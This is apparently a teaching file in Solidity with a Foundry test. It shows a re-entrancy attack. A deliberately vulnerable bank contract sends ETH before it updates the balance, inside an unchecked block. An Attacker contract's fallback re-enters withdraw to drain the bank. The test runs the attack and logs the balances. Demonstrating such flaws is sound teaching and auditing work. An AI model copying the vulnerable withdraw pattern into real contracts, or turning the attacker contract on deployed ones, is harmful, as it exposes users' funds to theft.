// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title Vulnerable Bank (Re-entrancy Demo)
contract VulnerableBank {
    mapping(address => uint256) public balances;

    /// @notice deposit ETH into bank
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice withdraw ETH (VULNERABLE to re-entrancy)
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Not enough balance");

       
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // Update after transfer (wrong order)
        unchecked {
            balances[msg.sender] -= _amount;
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/// @title Attacker contract to exploit re-entrancy
contract Attacker {
    VulnerableBank public bank;
    address public owner;
    

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: msg.value}();
        bank.withdraw(1 ether); // trigger re-entrancy
    }

    // fallback is triggered when receiving ETH
    fallback() external payable {
        if (address(bank).balance >= msg.value) {
            // Keep re-entering withdraw()
            bank.withdraw(msg.value);
        }
    }
}

/// @title Foundry Test
contract VulnerableBankTest is Test {
    VulnerableBank bank;
    Attacker attacker;
    address alice = address(0xABCD);

    function setUp() public {
        bank = new VulnerableBank();

        // Fund Alice and deposit into bank
        vm.deal(alice, 5 ether);
        vm.startPrank(alice);
        bank.deposit{value: 5 ether}();
        vm.stopPrank();

        // Deploy attacker contract
        attacker = new Attacker(address(bank));

        // Fund attacker EOA
        vm.deal(address(this), 1 ether);
    }

    function testReentrancyAttack() public {
        emit log_named_uint("Bank balance before", bank.getBalance());
        emit log_named_uint(
            "Attacker balance before",
            address(attacker).balance
        );

        // Run attack
        attacker.attack{value: 1 ether}();

        emit log_named_uint("Bank balance after", bank.getBalance());
        emit log_named_uint(
            "Attacker balance after",
            address(attacker).balance
        );

        // assertEq(bank.getBalance(), 0, "Bank should be drained");
    }
}
